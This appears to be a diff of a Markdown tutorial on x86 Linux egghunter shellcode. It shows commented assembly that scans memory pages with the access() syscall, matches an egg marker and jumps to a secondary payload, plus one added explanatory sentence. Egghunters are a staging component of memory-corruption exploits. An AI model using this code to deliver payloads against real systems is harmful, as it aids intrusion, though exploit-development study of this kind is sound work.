@@ -75,7 +75,7 @@ _start:
     lea ebx, [edx+0x4]     ; Load the address of the next 8 bytes in EBX to check
     mov al, 0x21           ; Load Syscall value for access() = 0x21 OR 33 in EAX
     int 0x80               ; Executing access() syscall
-    cmp al, 0xf2           ; Comparing the return value in AL to 0xf2 or EFAULT
+    cmp al, 0xf2           ; Comparing the return value in AL to 0xf2 == EFAULT
     popad                  ; Restore the register values as we preserved in the stack
     jz turn_page           ; Jump to next page if we got EFAULT otherwise continue
 
@@ -86,3 +86,6 @@ _start:
     jnz check_page         ; If not zero - Egg wasn't found, false positive! otherwise if zero - mission accomplished - egg found successfully!
     jmp edx                ; Transfer control to the secondary payload
 ```
+
+There's not much to exaplain in this source as I have commented in-detail on almost every line of code. 
+
